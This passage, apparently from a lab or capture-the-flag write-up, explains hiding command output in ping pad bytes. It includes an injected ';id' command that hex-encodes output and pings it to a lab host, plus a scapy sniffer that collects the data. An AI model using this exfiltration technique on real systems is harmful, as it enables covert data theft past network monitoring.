Eventually, I came across the -p argument for ping after reading this blogpost (http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html). From man ping we read:
-p pattern
   You may specify up to 16 ``pad'' bytes to fill out the packet you send.
   This is useful for diagnosing data-dependent problems in a network.
   For example, ``-p ff'' will cause the sent packet to be filled with all ones.

;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done

More easily read data with this scapy filter: sniff(filter="icmp[icmptype] == 8 and host 192.168.56.104", prn=lambda x: x.load)
